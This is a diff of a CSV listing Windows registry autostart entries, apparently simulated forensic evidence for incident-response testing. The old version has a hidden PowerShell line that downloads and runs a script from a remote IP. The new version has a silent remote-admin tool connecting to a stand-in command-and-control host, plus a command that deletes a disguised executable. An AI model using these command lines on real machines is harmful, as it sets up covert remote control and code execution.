@@ -1,3 +1,4 @@
-KeyPath,ValueName,ValueData,LastWriteTimeUTC
-Software\Microsoft\Windows\CurrentVersion\Run,OneDrive,"C:\Users\analyst\AppData\Local\Microsoft\OneDrive\OneDrive.exe",2024-01-15 10:00:00
-Software\Microsoft\Windows\CurrentVersion\Run,SecurityUpdate,"powershell -w hidden -c IEX (New-Object Net.WebClient).DownloadString('http://198.51.100.23/s')",2026-03-15 14:25:30
+HivePath,KeyPath,KeyName,ValueName,ValueType,ValueData,LastWriteTimestamp,DeletedKey
+C:\Users\analyst\NTUSER.DAT,Software\Microsoft\Windows\CurrentVersion\Run,Run,RemoteHandsSync,REG_SZ,"C:\Users\analyst\Downloads\remote-admin.exe --connect c2.example.com --silent",2026-03-15 14:22:03.0512018,No
+C:\Users\analyst\NTUSER.DAT,Software\Microsoft\Windows\CurrentVersion\Run,Run,OneDrive,REG_SZ,"\"C:\Users\analyst\AppData\Local\Microsoft\OneDrive\OneDrive.exe\" /background",2025-09-12 08:18:42.1019847,No
+C:\Users\analyst\NTUSER.DAT,Software\Microsoft\Windows\CurrentVersion\RunOnce,RunOnce,_HelperCleanup,REG_SZ,"cmd.exe /c del C:\Users\analyst\Downloads\quarterly-report.pdf.exe",2026-03-15 14:36:11.1100118,No
